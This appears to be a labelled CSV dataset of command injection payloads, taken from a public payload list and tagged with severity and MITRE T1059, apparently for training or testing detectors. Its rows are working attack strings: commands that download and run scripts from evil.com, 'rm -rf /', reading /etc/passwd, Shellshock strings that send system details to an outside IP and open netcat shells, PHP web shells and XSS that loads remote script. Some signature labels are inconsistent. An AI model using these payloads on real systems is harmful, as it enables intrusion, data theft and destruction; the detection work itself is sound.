Payload,Signature,AttackType,Severity,MITRE,Label,Description
%0Aid%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ping -i 30 127.0.0.1 &,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ping -n 30 127.0.0.1 &,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0a ping -i 30 127.0.0.1 %0a,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
`ping 127.0.0.1`,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0a id %0a,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
`id`,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
$;/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; rm -rf /,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; curl http://evil.com/shell.sh | bash,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; rm -rf /,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"; echo ""vulnerable"" > /tmp/pwned.txt",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& whoami,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& whoami,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; rm -rf /,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; rm -rf /,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| cat /etc/passwd,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0a%0d,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0Aid,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0a id %0a,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0Aid%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0a ping -i 30 127.0.0.1 %0a,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0A/usr/bin/id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%0A/usr/bin/id%0A,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%20{${phpinfo()}},CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%20{${sleep(20)}},CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
%20{${sleep(3)}},CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
a|id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
a;id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
a;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
a;id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",CommandInjection_Generic,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",CommandInjection_Generic,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| netstat -an,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
$(`dir`),CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&&dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& dir,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
dir C:\,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
dir C:\Documents and Settings\*,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
dir C:\Users,CMDi_Unix,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
;echo%20'<script>alert(1)</script>',XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
;echo '<script>alert(1)</script>',XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
echo '<script>alert(1)</script>'// XXXXXXXXXXX,XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,XSS_Script,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
() { :;}; echo vulnerable 10,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('ls'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('pwd'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('pwd');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('sleep 5'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('sleep 5');,CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('whoami'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
eval('whoami');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
